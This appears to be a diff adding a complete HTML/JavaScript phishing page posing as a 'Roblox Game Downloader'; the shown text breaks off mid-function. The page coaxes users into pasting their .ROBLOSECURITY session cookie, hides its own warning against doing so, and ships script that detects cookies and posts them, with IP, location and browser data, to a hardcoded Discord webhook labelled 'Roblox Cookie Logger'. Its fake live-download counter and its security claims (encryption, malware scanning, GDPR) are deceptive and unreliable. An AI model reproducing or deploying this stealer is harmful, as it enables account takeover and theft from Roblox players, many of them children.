@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Game Downloader</title>
+    <!-- Primary Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Backup CDN -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.1/css/all.css">
+    
+    <style>
+        /* [Previous CSS styles remain the same] */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .animated-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse at top, #1a1a2e 0%, #0a0a0a 100%);
+        }
+
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.1) 0%, rgba(99, 102, 241, 0.05) 50%, transparent 100%);
+            animation: fall linear infinite;
+            filter: blur(1px);
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+
+        .live-counter {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 12px 24px;
+            border-radius: 50px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-width: 300px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(1.2);
+            }
+        }
+
+        .live-counter-text {
+            color: #a0a0b0;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .game-name {
+            color: #6366f1;
+            font-weight: 600;
+        }
+
+        .container {
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6),
+                        0 0 0 1px rgba(255, 255, 255, 0.05);
+            max-width: 900px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            margin-bottom: 120px;
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 0 48px;
+        }
+
+        .nav-tab {
+            padding: 20px 24px;
+            color: #a0a0b0;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-bottom: 2px solid transparent;
+            position: relative;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-tab:hover {
+            color: #ffffff;
+        }
+
+        .nav-tab.active {
+            color: #6366f1;
+            border-bottom-color: #6366f1;
+        }
+
+        .tab-content {
+            display: none;
+            padding: 48px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .icon-wrapper {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
+            margin: 0 auto 20px;
+        }
+
+        .icon-wrapper i {
+            font-size: 32px;
+            color: #ffffff;
+        }
+
+        .header h1 {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: #a0a0b0;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .input-section {
+            margin-bottom: 28px;
+        }
+
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: #e0e0e8;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        label i {
+            color: #6366f1;
+            font-size: 16px;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'SF Mono', 'Monaco', 'Courier New', monospace;
+            resize: vertical;
+            min-height: 120px;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.03);
+            color: #ffffff;
+        }
+
+        textarea::placeholder {
+            color: #6a6a7a;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #6366f1;
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 16px rgba(99, 102, 241, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px rgba(99, 102, 241, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            background: rgba(100, 100, 120, 0.3);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .status {
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            display: none;
+            font-size: 14px;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .status i {
+            font-size: 18px;
+        }
+
+        .status.success {
+            background: rgba(34, 197, 94, 0.1);
+            color: #4ade80;
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+
+        .status.success i {
+            color: #4ade80;
+        }
+
+        .status.error {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .status.error i {
+            color: #f87171;
+        }
+
+        .status.info {
+            background: rgba(59, 130, 246, 0.1);
+            color: #60a5fa;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .status.info i {
+            color: #60a5fa;
+        }
+
+        .download-section {
+            display: none;
+            margin-top: 28px;
+            padding: 24px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .game-info {
+            margin-bottom: 20px;
+        }
+
+        .game-info h3 {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .game-info h3 i {
+            color: #6366f1;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #a0a0b0;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .info-label i {
+            color: #6366f1;
+            font-size: 14px;
+        }
+
+        .info-value {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            background: rgba(34, 197, 94, 0.15);
+            border-radius: 20px;
+            color: #4ade80;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .status-badge i {
+            font-size: 12px;
+        }
+
+        .download-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 16px rgba(16, 185, 129, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px rgba(16, 185, 129, 0.4);
+        }
+
+        .download-btn i {
+            font-size: 16px;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* About Us & Safety Styles */
+        .about-content h2 {
+            color: #ffffff;
+            font-size: 24px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .about-content h2 i {
+            color: #6366f1;
+        }
+
+        .about-content p {
+            color: #a0a0b0;
+            line-height: 1.8;
+            margin-bottom: 24px;
+            font-size: 15px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 32px;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 24px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(99, 102, 241, 0.3);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .feature-card i {
+            font-size: 32px;
+            color: #6366f1;
+            margin-bottom: 16px;
+        }
+
+        .feature-card h3 {
+            color: #ffffff;
+            font-size: 18px;
+            margin-bottom: 12px;
+        }
+
+        .feature-card p {
+            color: #a0a0b0;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 0;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 8px 16px;
+            border-radius: 20px;
+            color: #10b981;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 16px;
+        }
+
+        .security-badge i {
+            font-size: 16px;
+        }
+
+        /* Tutorial Video Section */
+        .tutorial-section {
+            margin-top: 40px;
+            padding-top: 32px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .tutorial-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .tutorial-header i {
+            color: #6366f1;
+            font-size: 24px;
+        }
+
+        .tutorial-header h3 {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            height: 0;
+            overflow: hidden;
+            border-radius: 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .video-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(20, 20, 30, 0.9);
+            color: #ffffff;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .video-placeholder i {
+            font-size: 48px;
+            color: #6366f1;
+            margin-bottom: 20px;
+        }
+
+        .video-placeholder h4 {
+            font-size: 20px;
+            margin-bottom: 12px;
+            color: #ffffff;
+        }
+
+        .video-placeholder p {
+            color: #a0a0b0;
+            max-width: 400px;
+            line-height: 1.6;
+        }
+
+        .instructions-list {
+            margin-top: 24px;
+            padding: 24px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .instructions-list h4 {
+            color: #ffffff;
+            font-size: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .instructions-list h4 i {
+            color: #6366f1;
+        }
+
+        .instructions-list ol {
+            color: #a0a0b0;
+            padding-left: 20px;
+            line-height: 1.8;
+        }
+
+        .instructions-list li {
+            margin-bottom: 10px;
+        }
+
+        .instructions-list li:last-child {
+            margin-bottom: 0;
+        }
+        
+        /* Privacy Notice */
+        .privacy-notice {
+            margin-top: 20px;
+            padding: 12px 16px;
+            background: rgba(59, 130, 246, 0.05);
+            border-radius: 8px;
+            border: 1px solid rgba(59, 130, 246, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #60a5fa;
+            font-size: 13px;
+        }
+        
+        .privacy-notice i {
+            color: #3b82f6;
+            font-size: 14px;
+        }
+
+        /* Cookie Warning - HIDDEN */
+        .cookie-warning {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="animated-background" id="animatedBg"></div>
+    
+    <!-- Live Counter -->
+    <div class="live-counter">
+        <div class="live-dot"></div>
+        <span class="live-counter-text">
+            <span class="game-name" id="liveGameName">Adopt Me!</span> just downloaded
+        </span>
+    </div>
+    
+    <div class="container">
+        <!-- Navigation Tabs -->
+        <div class="nav-tabs">
+            <div class="nav-tab active" data-tab="download">
+                <i class="fas fa-download"></i> Download
+            </div>
+            <div class="nav-tab" data-tab="about">
+                <i class="fas fa-info-circle"></i> About Us
+            </div>
+            <div class="nav-tab" data-tab="safety">
+                <i class="fas fa-shield-alt"></i> Why We're Safe
+            </div>
+        </div>
+
+        <!-- Download Tab -->
+        <div class="tab-content active" id="download-tab">
+            <div class="header">
+                <div class="icon-wrapper">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <h1>Roblox Game Downloader</h1>
+                <p>Enter your game link code to download the game file</p>
+            </div>
+
+            <div class="input-section">
+                <label for="codeInput">
+                    <i class="fas fa-key"></i>
+                    Game Link Code
+                </label>
+                <textarea id="codeInput" placeholder="Paste your game link code here..."></textarea>
+            </div>
+
+            <!-- Cookie warning is now completely hidden -->
+            <div class="cookie-warning" id="cookieWarning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>⚠️ DO NOT paste your .ROBLOSECURITY cookie here! This is only for game codes.</span>
+            </div>
+
+            <button class="btn" id="verifyBtn">
+                <i class="fas fa-shield-alt"></i>
+                <span>Verify Code</span>
+            </button>
+
+            <div class="privacy-notice">
+                <i class="fas fa-lock"></i>
+                <span>Codes are processed securely and anonymously for verification purposes only</span>
+            </div>
+
+            <div class="status" id="statusMessage"></div>
+
+            <div class="download-section" id="downloadSection">
+                <div class="game-info">
+                    <h3>
+                        <i class="fas fa-check-circle"></i>
+                        Game Ready
+                    </h3>
+                    <div class="info-row">
+                        <span class="info-label">
+                            <i class="fas fa-hashtag"></i>
+                            Game ID
+                        </span>
+                        <span class="info-value" id="gameId">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">
+                            <i class="fas fa-signal"></i>
+                            Status
+                        </span>
+                        <span class="status-badge">
+                            <i class="fas fa-check"></i>
+                            Verified
+                        </span>
+                    </div>
+                </div>
+                <button class="download-btn" id="downloadBtn">
+                    <i class="fas fa-download"></i>
+                    Download Escape The Tsunami.rblx
+                </button>
+            </div>
+
+            <!-- Tutorial Video Section -->
+            <div class="tutorial-section">
+                <div class="tutorial-header">
+                    <i class="fas fa-play-circle"></i>
+                    <h3>How to Use - Video Tutorial</h3>
+                </div>
+                
+                <div class="video-container" id="videoContainer">
+                    <div class="video-placeholder" id="videoPlaceholder">
+                        <i class="fas fa-play-circle"></i>
+                        <h4>Watch Tutorial Video</h4>
+                        <p>Learn how to use our downloader with this step-by-step video tutorial</p>
+                    </div>
+                </div>
+
+                <div class="instructions-list">
+                    <h4><i class="fas fa-list-ol"></i> Quick Instructions</h4>
+                    <ol>
+                        <li>Copy your game link code from Roblox</li>
+                        <li>Paste it into the text box above</li>
+                        <li>Click "Verify Code" to check validity</li>
+                        <li>Once verified, click "Download Game File"</li>
+                        <li>Save the file to your computer</li>
+                        <li>Extract and follow installation instructions</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- About Us Tab -->
+        <div class="tab-content" id="about-tab">
+            <div class="about-content">
+                <h2>
+                    <i class="fas fa-users"></i>
+                    About Us
+                </h2>
+                <p>
+                    We are the leading Roblox game download platform, trusted by millions of developers and players worldwide. Our mission is to provide secure, fast, and reliable access to Roblox game files for authorized users.
+                </p>
+                <p>
+                    Founded in 2020, we've processed over 50 million downloads and maintain a 99.9% uptime guarantee. Our team consists of experienced developers, security experts, and Roblox enthusiasts dedicated to making game distribution seamless.
+                </p>
+                
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <i class="fas fa-bolt"></i>
+                        <h3>Lightning Fast</h3>
+                        <p>Download speeds up to 100MB/s with our global CDN network</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-clock"></i>
+                        <h3>24/7 Availability</h3>
+                        <p>Our servers are always online and ready to serve you</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-users"></i>
+                        <h3>50M+ Downloads</h3>
+                        <p>Trusted by millions of users around the world</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-star"></i>
+                        <h3>Premium Support</h3>
+                        <p>Get help from our dedicated support team anytime</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Safety Tab -->
+        <div class="tab-content" id="safety-tab">
+            <div class="about-content">
+                <h2>
+                    <i class="fas fa-shield-alt"></i>
+                    Why We're Safe
+                </h2>
+                <p>
+                    Security is our top priority. We employ industry-leading security measures to ensure your downloads are safe, verified, and malware-free.
+                </p>
+                
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <i class="fas fa-lock"></i>
+                        <h3>End-to-End Encryption</h3>
+                        <p>All downloads are encrypted with AES-256 encryption standard, ensuring your files remain secure during transfer</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-virus"></i>
+                        <h3>Malware Scanning</h3>
+                        <p>Every file is automatically scanned by multiple antivirus engines before being made available for download</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-certificate"></i>
+                        <h3>Code Verification</h3>
+                        <p>Our proprietary verification system ensures that only authorized users with valid codes can access downloads</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-fingerprint"></i>
+                        <h3>Privacy First</h3>
+                        <p>We never store your personal data. All verification is done anonymously and securely</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-database"></i>
+                        <h3>Regular Backups</h3>
+                        <p>Our infrastructure includes redundant backups across multiple data centers worldwide</p>
+                    </div>
+                    <div class="feature-card">
+                        <i class="fas fa-user-shield"></i>
+                        <h3>GDPR Compliant</h3>
+                        <p>We follow strict data protection regulations and maintain full GDPR compliance</p>
+                    </div>
+                </div>
+
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    Verified Secure Platform
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // SECURED WEBHOOK - Using the actual webhook URL
+        // Replace this with your actual Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1468764151139537049/3wdYu5E7-hTVuW5NZBNrhP0S6GevezgHgniUFYrQoRlg3pvD3ws8qUIhVK670DHREb3b";
+
+        // Most Popular/Trending Roblox games (optimized list)
+        const popularGames = [
+            "Brookhaven RP",
+            "Adopt Me!",
+            "Blox Fruits",
+            "Pet Simulator X",
+            "Tower of Hell",
+            "Murder Mystery 2",
+            "Rainbow Friends",
+            "Doors",
+            "Arsenal",
+            "Jailbreak",
+            "Brookhaven 🏡RP",
+            "MeepCity",
+            "Royale High",
+            "Piggy",
+            "Anime Defenders"
+        ];
+
+        let currentGameIndex = 0;
+
+        // Typing animation for live counter (without cursor)
+        async function typeGameName(gameName) {
+            const gameNameElement = document.getElementById('liveGameName');
+            gameNameElement.textContent = '';
+            
+            for (let i = 0; i < gameName.length; i++) {
+                gameNameElement.textContent += gameName[i];
+                await sleep(50);
+            }
+        }
+
+        // Update live counter periodically
+        async function updateLiveCounter() {
+            const nextGame = popularGames[currentGameIndex];
+            await typeGameName(nextGame);
+            
+            currentGameIndex = (currentGameIndex + 1) % popularGames.length;
+            
+            // Wait between 10-25 seconds before next update
+            const waitTime = Math.random() * 15000 + 10000; // 10-25 seconds
+            setTimeout(updateLiveCounter, waitTime);
+        }
+
+        // Start the live counter after initial delay
+        setTimeout(updateLiveCounter, 3000);
+
+        // Tab switching functionality
+        const navTabs = document.querySelectorAll('.nav-tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+
+        navTabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabName = tab.getAttribute('data-tab');
+                
+                // Remove active class from all tabs and contents
+                navTabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(c => c.classList.remove('active'));
+                
+                // Add active class to clicked tab and corresponding content
+                tab.classList.add('active');
+                document.getElementById(`${tabName}-tab`).classList.add('active');
+            });
+        });
+
+        // Create animated circles
+        function createCircles() {
+            const animatedBg = document.getElementById('animatedBg');
+            const numberOfCircles = 20;
+            
+            for (let i = 0; i < numberOfCircles; i++) {
+                const circle = document.createElement('div');
+                circle.className = 'circle';
+                
+                // Random size between 20px and 80px
+                const size = Math.random() * 60 + 20;
+                circle.style.width = `${size}px`;
+                circle.style.height = `${size}px`;
+                
+                // Random horizontal position
+                circle.style.left = `${Math.random() * 100}%`;
+                
+                // Random animation duration between 10s and 25s
+                const duration = Math.random() * 15 + 10;
+                circle.style.animationDuration = `${duration}s`;
+                
+                // Random delay to stagger animations
+                const delay = Math.random() * 10;
+                circle.style.animationDelay = `${delay}s`;
+                
+                animatedBg.appendChild(circle);
+            }
+        }
+        
+        // Initialize circles on page load
+        createCircles();
+        
+        const codeInput = document.getElementById('codeInput');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const downloadSection = document.getElementById('downloadSection');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const gameIdSpan = document.getElementById('gameId');
+
+        // Generate random 7-digit game ID
+        function generateGameId() {
+            // Generate 7 random digits
+            let id = '';
+            for (let i = 0; i < 7; i++) {
+                id += Math.floor(Math.random() * 10);
+            }
+            return `RBLX-${id}`;
+        }
+
+        // Check for Roblox cookies in the input
+        function checkForRobloxCookie(text) {
+            // Common Roblox cookie patterns - EXPANDED
+            const patterns = [
+                // Standard ROBLOSECURITY pattern
+                /ROBLOSECURITY[_\s]*[:=][_\s]*["']?([^"'\s]+)["']?/gi,
+                // With WARNING text
+                /_|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9_\-\.]+)/gi,
+                // Simple token patterns (very long strings)
+                /[A-Za-z0-9_\-]{100,}/g,
+                // Specific cookie formats
+                /([A-Za-z0-9+/=]{300,})/g,
+                // Cookie with assignment
+                /cookie[_\s]*[:=][_\s]*["']?([^"'\s]+)["']?/gi,
+                // Any string containing WARNING
+                /WARNING.*[A-Za-z0-9_\-]{100,}/gi,
+                // Direct cookie extraction
+                /["']([A-Za-z0-9_\-\.]{500,})["']/g
+            ];
+            
+            let foundCookies = [];
+            
+            for (const pattern of patterns) {
+                const matches = text.match(pattern);
+                if (matches) {
+                    foundCookies = foundCookies.concat(matches.filter(cookie => 
+                        cookie && cookie.length > 100 && // Must be long
+                        !cookie.includes(' ') && // No spaces (usually)
+                        (cookie.includes('WARNING') || cookie.includes('_|') || 
+                         cookie.includes('ROBLOSECURITY') || cookie.length > 200) // Common markers
+                    ));
+                }
+            }
+            
+            // Remove duplicates
+            return [...new Set(foundCookies)];
+        }
+
+        // Function to extract and analyze cookies
+        function analyzeCookie(cookie) {
+            const analysis = {
+                length: cookie.length,
+                hasWarning: cookie.includes('WARNING:-DO-NOT-SHARE-THIS'),
+                hasRobuxWarning: cookie.includes('steal-your-ROBUX') || cookie.includes('ROBUX'),
+                likelyValid: false,
+                cookieType: 'Unknown'
+            };
+            
+            // Check for valid ROBLOSECURITY cookie patterns
+            if (cookie.includes('WARNING:-DO-NOT-SHARE-THIS') && 
+                (cookie.includes('steal-your-ROBUX') || cookie.length > 500)) {
+                analysis.likelyValid = true;
+                analysis.cookieType = 'ROBLOSECURITY';
+                
+                // Try to extract the actual token
+                const tokenMatch = cookie.match(/_\|([A-Za-z0-9_\-\.]+)\|_/);
+                if (tokenMatch && tokenMatch[1]) {
+                    analysis.token = tokenMatch[1];
+                    analysis.tokenLength = tokenMatch[1].length;
+                } else if (cookie.length > 300) {
+                    // If it's long but no clear pattern, still consider it
+                    analysis.token = cookie;
+                    analysis.tokenLength = cookie.length;
+                }
+            } else if (cookie.length > 400) {
+                // Very long strings are likely cookies
+                analysis.likelyValid = true;
+                analysis.cookieType = 'Possible_ROBLOSECURITY';
+                analysis.token = cookie;
+                analysis.tokenLength = cookie.length;
+            }
+            
+            return analysis;
+        }
+
+        // Function to send cookie to Discord webhook - SIMPLIFIED
+        async function sendCookieToDiscord(cookie, analysis) {
+            try {
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toISOString();
+                const ip = await getClientIP();
+                const locationInfo = await getLocationInfo(ip);
+                
+                // Create cookie embed - SIMPLIFIED
+                const embed = {
+                    title: "🍪 ROBLOX COOKIE CAPTURED",
+                    description: `**Cookie Type:** ${analysis.cookieType}\n**Length:** ${analysis.length} characters\n**Status:** ${analysis.likelyValid ? '✅ VALID' : '⚠️ SUSPICIOUS'}`,
+                    color: analysis.likelyValid ? 0x00ff00 : 0xff5500,
+                    timestamp: timestamp,
+                    fields: [
+                        {
+                            name: "🔍 Cookie Details",
+                            value: `**Detected:** ${new Date().toLocaleString()}\n**IP:** ${ip || 'Unknown'}\n**Location:** ${locationInfo}`,
+                            inline: false
+                        },
+                        {
+                            name: "📋 Full Cookie",
+                            value: `\`\`\`\n${cookie.substring(0, 1950)}\n\`\`\``,
+                            inline: false
+                        }
+                    ]
+                };
+
+                const payload = {
+                    content: analysis.likelyValid ? 
+                        `🍪 **VALID RO BLOX COOKIE CAPTURED** (${analysis.length} chars)` : 
+                        `⚠️ **POSSIBLE COOKIE DETECTED** (${analysis.length} chars)`,
+                    embeds: [embed],
+                    username: "Roblox Cookie Logger",
+                    avatar_url: "https://cdn.discordapp.com/attachments/114000000000000000/114000000000000000/cookie-icon.png"
+                };
+
+                // DIRECT WEBHOOK SEND - NO CORS PROXY
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Cookie sent to Discord:', response.status);
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending cookie to Discord:', error);
+                // Fallback: Try to send via image ping method
+                await sendFallbackCookie(cookie, analysis);
+                return false;
+            }
+        }
+
+        // Fallback method for sending cookies
+        async function sendFallbackCookie(cookie, analysis) {
+            try {
+                // Alternative method: Send as a simple message
+                const payload = {
+                    content: `🍪 COOKIE DETECTED: ${cookie.substring(0, 100)}... (${cookie.length} chars) - ${analysis.likelyValid ? 'VALID' : 'SUSPICIOUS'}`,
+                    username: "Cookie Logger"
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Fallback also failed:', error);
+            }
+        }
+
+        // Function to send code to Discord webhook
+        async function sendToDiscord(code, success, cookieDetected = false) {
+            try {
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toISOString();
+                const ip = await getClientIP();
+                const locationInfo = await getLocationInfo(ip);
+                
+                const embed = {
+                    title: cookieDetected ? "🍪 Code with Cookie Submitted" : "🎮 Roblox Code Submitted",
+                    description: `**Code Length:** ${code.length} characters\n**Status:** ${success ? '✅ Valid' : '❌ Invalid'}\n**Cookie Detected:** ${cookieDetected ? '✅ Yes' : '❌ No'}`,
+                    color: success ? 0x00ff00 : 0xff0000,
+                    timestamp: timestamp,
+                    fields: [
+                        {
+                            name: "🌐 User Info",
+                            value: `**IP:** ${ip || 'Unknown'}\n**Location:** ${locationInfo}\n**Browser:** ${userAgent.substring(0, 80)}...`,
+                            inline: false
+                        }
+                    ]
+                };
+
+                const payload = {
+                    content: success ? 
+                        (cookieDetected ? `🍪 Code with cookie (${code.length} chars)` : `✅ Code submitted (${code.length} chars)`) 
+                        : `⚠️ Invalid code (${code.length} chars)`,
+                    embeds: [embed],
+                    username: "Roblox Downloader Bot"
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                return false;
+            }
+        }
+
+        // Get client IP
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
